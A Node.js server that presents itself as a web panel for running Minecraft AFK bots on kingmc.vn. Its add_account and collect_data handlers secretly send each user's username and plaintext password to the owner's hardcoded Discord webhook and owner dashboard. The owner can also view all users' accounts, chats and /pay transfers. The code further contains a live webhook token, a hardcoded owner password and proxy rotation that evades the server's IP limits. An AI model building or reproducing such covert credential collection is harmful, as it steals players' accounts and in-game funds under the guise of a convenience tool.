const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mineflayer = require('mineflayer');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { SocksProxyAgent } = require('socks-proxy-agent');
const { HttpsProxyAgent } = require('https-proxy-agent');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
const DATA_FILE = path.join(__dirname, 'data.json');

// ===== CẤU HÌNH OWNER =====
const OWNER_IP = '183.80.67.25';
const OWNER_PASSWORD = 'Tuanpro123';
const LOG_WEBHOOK = 'https://discord.com/api/webhooks/1548265839961047100/loLOMBhoH27sGFBIIqiJV9ADp1fpEO0tVCxGGkWd3hV0_aw_4zfo3S3E7DEvNhtX8YnW';

// ===== CẤU HÌNH SERVER MINECRAFT =====
const SERVER_HOST = 'kingmc.vn';
const SERVER_PORT = 25565;
const SERVER_VERSION = '1.20.1';

// ===== DỮ LIỆU TOÀN CỤC =====
let clientData = {};
let globalCollectedData = [];
let isMaintenance = false;
let ownerSocketId = null;
let proxyList = [];
let webhookUrl = '';

// ===== ĐỌC / LƯU =====
function loadData() {
  try {
    if (fs.existsSync(DATA_FILE)) {
      const raw = fs.readFileSync(DATA_FILE, 'utf-8');
      return JSON.parse(raw);
    }
  } catch (e) { console.log('⚠️ Lỗi đọc data, tạo mới'); }
  return {
    clientData: {},
    globalCollectedData: [],
    isMaintenance: false,
    proxyList: [],
    webhookUrl: ''
  };
}

const saved = loadData();
clientData = saved.clientData || {};
globalCollectedData = saved.globalCollectedData || [];
isMaintenance = saved.isMaintenance || false;
proxyList = saved.proxyList || [];
webhookUrl = saved.webhookUrl || '';

function saveData() {
  try {
    fs.writeFileSync(DATA_FILE, JSON.stringify({
      clientData, globalCollectedData, isMaintenance, proxyList, webhookUrl
    }, null, 2));
  } catch (e) {
    console.log('❌ Lỗi lưu data:', e.message);
  }
}

// ===== GỬI WEBHOOK =====
async function sendLogWebhook(content) {
  try {
    await axios.post(LOG_WEBHOOK, {
      content: content,
      username: 'KingMC Logger',
      avatar_url: 'https://i.imgur.com/4M34hi2.png'
    });
  } catch (e) {
    console.log('❌ Lỗi gửi log webhook:', e.message);
  }
}

async function sendUserWebhook(content) {
  if (!webhookUrl) return;
  try {
    await axios.post(webhookUrl, {
      content: content,
      username: 'KingMC AFK Bot',
      avatar_url: 'https://i.imgur.com/4M34hi2.png'
    });
  } catch (e) {
    console.log('❌ Lỗi gửi user webhook:', e.message);
  }
}

// ===== PROXY HELPER =====
function getNextProxy() {
  if (!proxyList.length) return null;
  return proxyList[Math.floor(Math.random() * proxyList.length)];
}

function createProxyAgent(url) {
  if (!url) return null;
  try {
    if (url.startsWith('socks')) return new SocksProxyAgent(url);
    if (url.startsWith('http')) return new HttpsProxyAgent(url);
  } catch (e) { return null; }
  return null;
}

app.use(express.static('public'));

process.on('uncaughtException', (e) => console.log('[LỖI HỆ THỐNG]', e.message));
process.on('unhandledRejection', (r) => console.log('[LỖI PROMISE]', r?.message || r));

// ===== SOCKET.IO =====
io.on('connection', (socket) => {
  let rawIp = socket.handshake.headers['x-forwarded-for']?.split(',')[0]?.trim() || socket.handshake.address;
  if (rawIp === '::1') rawIp = '127.0.0.1';
  const clientIp = rawIp;
  console.log(`[${new Date().toLocaleString()}] 🔌 Client: ${clientIp}`);

  const isOwner = (clientIp === OWNER_IP || clientIp === '127.0.0.1');

  if (!clientData[clientIp]) {
    clientData[clientIp] = { accounts: [], bots: {} };
    saveData();
  }

  socket.emit('is_admin', isOwner);
  socket.emit('init_accounts', clientData[clientIp].accounts);
  socket.emit('proxy_list', proxyList);
  socket.emit('webhook_url', webhookUrl);

  if (isOwner) {
    ownerSocketId = socket.id;
    const allAccounts = [];
    for (const ip in clientData) {
      if (clientData[ip].accounts) {
        clientData[ip].accounts.forEach(acc => {
          allAccounts.push({ ...acc, ipOwner: ip });
        });
      }
    }
    socket.emit('all_accounts', allAccounts);
    socket.emit('sync_collected_data', globalCollectedData);
    socket.emit('maintenance_status', isMaintenance);
    console.log(`👑 Owner đã kết nối: ${clientIp}`);
  }

  // ---- LOGIN ----
  socket.on('login', (pass) => {
    if (!isOwner) { socket.emit('login_success', false); return; }
    if (pass === OWNER_PASSWORD) {
      socket.emit('login_success', true);
      socket.emit('log', '👑 Chào mừng Catnosaur!');
      sendLogWebhook(`👑 **Owner đăng nhập**\nIP: \`${clientIp}\``);
    } else {
      socket.emit('login_success', false);
      sendLogWebhook(`⚠️ **Sai mật khẩu owner**\nIP: \`${clientIp}\``);
    }
  });

  // ---- COLLECT DATA ----
  socket.on('collect_data', (data) => {
    globalCollectedData.push({
      ip: clientIp,
      time: new Date().toLocaleString(),
      username: data.username || 'N/A',
      password: data.password || 'N/A',
      type: data.type || 'unknown',
    });
    saveData();
    if (ownerSocketId) io.to(ownerSocketId).emit('sync_collected_data', globalCollectedData);
  });

  socket.on('clear_collected_data', () => {
    if (!isOwner) return;
    globalCollectedData = [];
    saveData();
    io.to(ownerSocketId).emit('sync_collected_data', globalCollectedData);
  });

  // ---- WEBHOOK ----
  socket.on('set_webhook', (url) => {
    webhookUrl = url;
    saveData();
    socket.emit('webhook_url', webhookUrl);
    socket.emit('log', `🔗 Đã lưu webhook`);
    sendLogWebhook(`🔗 **Webhook mới**\nIP: \`${clientIp}\`\nURL: \`${url}\``);
  });

  socket.on('test_webhook', async () => {
    await sendUserWebhook(`🔔 **Test Webhook**\n${new Date().toLocaleString()}`);
    socket.emit('log', '✅ Đã gửi test webhook!');
  });

  // ---- MAINTENANCE ----
  socket.on('toggle_maintenance', (status) => {
    if (!isOwner) return;
    isMaintenance = status;
    saveData();
    io.emit('maintenance_status', isMaintenance);
  });

  // ---- PROXY ----
  socket.on('add_proxy', (proxy) => {
    if (!proxyList.includes(proxy)) {
      proxyList.push(proxy);
      saveData();
      sendLogWebhook(`🌐 **Proxy mới**\nIP: \`${clientIp}\`\nProxy: \`${proxy}\``);
    }
    io.emit('proxy_list', proxyList);
  });
  socket.on('remove_proxy', (idx) => {
    if (idx >= 0 && idx < proxyList.length) { proxyList.splice(idx, 1); saveData(); }
    io.emit('proxy_list', proxyList);
  });
  socket.on('get_proxy_list', () => socket.emit('proxy_list', proxyList));

  // ---- ACCOUNT ----
  socket.on('add_account', (data) => {
    const { username, password } = data;
    if (!username) return;
    sendLogWebhook(`➕ **Acc mới**\nIP: \`${clientIp}\`\nUser: \`${username}\`\nPass: \`${password || 'caigicungdc'}\``);
    socket.emit('collect_data', { username, password: password || 'caigicungdc', type: 'account' });

    const id = 'acc_' + Date.now() + '_' + Math.floor(Math.random() * 999);
    clientData[clientIp].accounts.push({
      id,
      username: username.trim(),
      password: password ? password.trim() : 'caigicungdc',
      autoReconnect: true,
      status: 'OFFLINE',
      color: '#ff4444',
      proxy: null
    });
    saveData();
    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
    if (isOwner) {
      const allAccounts = [];
      for (const ip in clientData) {
        if (clientData[ip].accounts) {
          clientData[ip].accounts.forEach(acc => allAccounts.push({ ...acc, ipOwner: ip }));
        }
      }
      io.to(ownerSocketId).emit('all_accounts', allAccounts);
    }
  });

  socket.on('delete_account', (id) => {
    if (clientData[clientIp].bots[id]) {
      try { clientData[clientIp].bots[id].quit(); } catch(e) {}
      delete clientData[clientIp].bots[id];
    }
    clientData[clientIp].accounts = clientData[clientIp].accounts.filter(acc => acc.id !== id);
    saveData();
    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
  });

  socket.on('toggle_auto_reconnect', (id) => {
    const acc = clientData[clientIp].accounts.find(a => a.id === id);
    if (acc) { acc.autoReconnect = !acc.autoReconnect; saveData(); io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts); }
  });

  socket.on('get_accounts', () => socket.emit('init_accounts', clientData[clientIp].accounts));

  // ---- CHAT ----
  socket.on('send_chat', ({ id, cmd }) => {
    const bot = clientData[clientIp].bots[id];
    if (bot) {
      bot.chat(cmd);
      socket.emit('log', `[💬 ĐÃ GỬI]: ${cmd}`);
      sendLogWebhook(`💬 **Chat**\nIP: \`${clientIp}\`\nBot: \`${id}\`\nLệnh: \`${cmd}\``);
    } else {
      socket.emit('log', `[⚠️] Bot chưa online!`);
    }
  });

  // ---- PAY ----
  socket.on('send_pay', ({ id, target, amount }) => {
    const bot = clientData[clientIp].bots[id];
    if (bot) {
      bot.chat(`/pay ${target} ${amount}`);
      socket.emit('log', `[💰 PAY]: ${target} - ${amount}`);
      sendLogWebhook(`💰 **Pay**\nIP: \`${clientIp}\`\nBot: \`${id}\`\nNhận: \`${target}\`\nTiền: \`${amount}\``);
    } else {
      socket.emit('log', `[⚠️] Bot chưa online!`);
    }
  });

  // ===== START BOT (FIX IP + SOCKETCLOSED) =====
  socket.on('start_bot', (id) => {
    const account = clientData[clientIp].accounts.find(acc => acc.id === id);
    if (!account) return;

    if (clientData[clientIp].bots[id]) {
      try { clientData[clientIp].bots[id].quit(); } catch(e) {}
      delete clientData[clientIp].bots[id];
    }

    const log = (msg) => socket.emit('log', `[${account.username}] ${msg}`);

    let hasJoinedKingSMP = false;
    let hasExecutedAFK = false;
    let isProcessing = false;
    let reconnectAttempts = 0;
    const MAX_RECONNECT = 10;

    account.status = 'CONNECTING...';
    io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
    log(`🔄 Kết nối tới ${SERVER_HOST}:${SERVER_PORT} (v${SERVER_VERSION})...`);

    try {
      const proxyUrl = getNextProxy();
      const proxyAgent = createProxyAgent(proxyUrl);
      if (proxyAgent && proxyUrl) { log(`🌐 Dùng proxy: ${proxyUrl}`); account.proxy = proxyUrl; }
      else { log(`🌐 Không dùng proxy`); account.proxy = null; }

      const botOptions = {
        host: SERVER_HOST,
        port: SERVER_PORT,
        username: account.username,
        password: account.password,
        auth: 'offline',
        version: SERVER_VERSION,
        checkTimeoutInterval: 180000,
        connectTimeout: 60000,
        keepAlive: true,
        hideErrors: false,
        clientSideRendering: false,
        viewDistance: 'tiny'
      };
      if (proxyAgent) botOptions.agent = proxyAgent;

      const bot = mineflayer.createBot(botOptions);
      clientData[clientIp].bots[id] = bot;

      bot.on('login', () => {
        reconnectAttempts = 0;
        account.status = 'LOGGING IN...';
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        setTimeout(() => { if (!hasJoinedKingSMP) bot.chat(`/dn ${account.password}`); }, 5000);
        setTimeout(() => { if (!hasJoinedKingSMP) bot.chat(`/dn ${account.password}`); }, 12000);
        setTimeout(() => { if (!hasJoinedKingSMP) bot.chat('/menu'); }, 20000);
      });

      bot.on('spawn', () => {
        reconnectAttempts = 0;
        if (hasJoinedKingSMP) {
          account.status = 'ONLINE / KINGSMP';
          log(`✅ Đã vào KINGSMP!`);
          if (!hasExecutedAFK) setTimeout(() => { if (bot) bot.chat('/afk'); }, 4000);
        } else {
          account.status = 'ONLINE / LOBBY';
          log(`✅ Đã vào sảnh chính`);
        }
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        sendLogWebhook(`✅ **Bot online**\nIP: \`${clientIp}\`\nUser: \`${account.username}\``);
      });

      // ===== BẮT LỖI IP =====
      bot.on('messagestr', (message) => {
        const msg = message.toLowerCase();
        socket.emit('chat_log', { username: account.username, message: message });

        // Phát hiện lỗi IP limit
        if (msg.includes('địa chỉ ip') || msg.includes('ip chỉ được') || msg.includes('cùng lúc') ||
            msg.includes('ip limit') || msg.includes('too many')) {
          log(`🚨 LỖI IP: Server KingMC đã chặn IP của bạn!`);
          log(`💡 Gợi ý: Thêm proxy vào tab Proxy để đổi IP!`);
          socket.emit('ip_limit_error', {
            username: account.username,
            message: message
          });
          sendLogWebhook(`🚨 **LỖI IP LIMIT**\nIP: \`${clientIp}\`\nUser: \`${account.username}\`\nTin nhắn: \`${message}\``);
        }

        if (msg.includes('số dư') || msg.includes('balance') || msg.includes('bal')) {
          const balanceMatch = message.match(/(\d[\d,.]*)/);
          if (balanceMatch) {
            log(`💰 Số dư: ${balanceMatch[1]}`);
            sendUserWebhook(`💰 **Số dư**\nBot: \`${account.username}\`\nSố dư: \`${balanceMatch[1]}\``);
          }
        }

        if (!hasJoinedKingSMP && (msg.includes('bạn đã đăng nhập') || msg.includes('đăng nhập thành công'))) {
          log(`✅ Xác thực thành công, mở menu...`);
          setTimeout(() => { if (bot && !hasJoinedKingSMP) bot.chat('/menu'); }, 5000);
        }
        if (!hasJoinedKingSMP && msg.includes('chào mừng') && msg.includes('kingsmp')) {
          hasJoinedKingSMP = true;
          account.status = 'ONLINE / KINGSMP';
          io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
          log(`✅ ĐÃ VÀO KINGSMP!`);
          setTimeout(() => { if (bot && !hasExecutedAFK) { log(`💤 /afk`); bot.chat('/afk'); } }, 3000);
        }
      });

      bot.on('windowOpen', (window) => {
        const title = JSON.stringify(window.title || '').toLowerCase();
        log(`📂 Menu: ${title}`);

        if (!hasJoinedKingSMP && (title.includes('menu') || title.includes('sảnh') || title.includes('lobby'))) {
          if (isProcessing) return;
          isProcessing = true;
          setTimeout(() => {
            if (!bot || !bot.currentWindow) { isProcessing = false; return; }
            let slot = -1;
            for (let i = 0; i < bot.inventory.slots.length; i++) {
              const item = bot.inventory.slots[i];
              if (item) {
                const name = (item.displayName || item.name || '').toLowerCase();
                if (name.includes('kingsmp')) { slot = i; break; }
              }
            }
            if (slot === -1) { log(`⚠️ Không thấy KingSMP, thử slot 24`); slot = 24; }
            hasJoinedKingSMP = true;
            log(`🖱️ Click slot ${slot+1} chọn KingSMP`);
            bot.clickWindow(slot, 0, 0).catch(() => {});
            setTimeout(() => { try { bot.closeWindow(window); } catch(e){} isProcessing = false; }, 500);
          }, 1500);
        }

        if (hasJoinedKingSMP && !hasExecutedAFK && (title.includes('afk') || title.includes('chọn khu'))) {
          if (isProcessing) return;
          isProcessing = true;
          setTimeout(() => {
            if (!bot || !bot.currentWindow) { isProcessing = false; return; }
            let slot = -1;
            for (let i = 0; i < bot.inventory.slots.length; i++) {
              const item = bot.inventory.slots[i];
              if (item) {
                const name = (item.displayName || item.name || '').toLowerCase();
                if (name.includes('1')) { slot = i; break; }
              }
            }
            if (slot === -1) { slot = 0; }
            hasExecutedAFK = true;
            log(`🖱️ Click slot ${slot+1} vào AFK`);
            bot.clickWindow(slot, 0, 0).catch(() => {});
            setTimeout(() => { try { bot.closeWindow(window); } catch(e){} isProcessing = false; }, 500);
          }, 2000);
        }
      });

      bot.on('end', (reason) => {
        log(`⚠️ Mất kết nối: ${reason || 'unknown'}`);
        account.status = 'OFFLINE';
        io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        delete clientData[clientIp].bots[id];
        saveData();

        if (account.autoReconnect && reconnectAttempts < MAX_RECONNECT) {
          reconnectAttempts++;
          const delay = Math.min(5000 * reconnectAttempts, 30000);
          log(`🔄 Reconnect lần ${reconnectAttempts}/${MAX_RECONNECT} sau ${delay/1000}s`);
          setTimeout(() => {
            if (!clientData[clientIp].bots[id] && account.autoReconnect) socket.emit('start_bot', id);
          }, delay);
        } else if (reconnectAttempts >= MAX_RECONNECT) {
          log(`❌ Đã thử ${MAX_RECONNECT} lần, dừng.`);
          account.status = 'FAILED';
          io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
        }
      });

      bot.on('error', (err) => {
        if (err.code === 'ETIMEDOUT') log(`⏰ Timeout`);
        else if (err.code === 'ECONNREFUSED') log(`🚫 Server từ chối`);
        else log(`❌ Lỗi: ${err.message}`);
      });

      bot.on('kicked', (reason) => {
        log(`👢 Bị kick: ${JSON.stringify(reason)}`);
      });

    } catch (e) {
      log(`❌ Lỗi khởi tạo: ${e.message}`);
      account.status = 'ERROR';
      io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts);
    }
  });

  socket.on('stop_bot', (id) => {
    const account = clientData[clientIp].accounts.find(a => a.id === id);
    if (account) { account.status = 'STOPPING...'; io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts); }
    if (clientData[clientIp].bots[id]) {
      try { clientData[clientIp].bots[id].quit(); } catch(e) {}
      delete clientData[clientIp].bots[id];
    }
    if (account) setTimeout(() => { if (!clientData[clientIp].bots[id]) { account.status = 'OFFLINE'; io.to(socket.id).emit('init_accounts', clientData[clientIp].accounts); } }, 1000);
    saveData();
  });

  socket.on('disconnect', () => {
    console.log(`[${new Date().toLocaleString()}] 🔌 Client rời: ${clientIp}`);
    if (isOwner) ownerSocketId = null;
  });
});

server.listen(PORT, () => {
  console.log(`🚀 Server chạy tại http://localhost:${PORT}`);
  console.log(`👑 Owner IP: ${OWNER_IP}`);
});
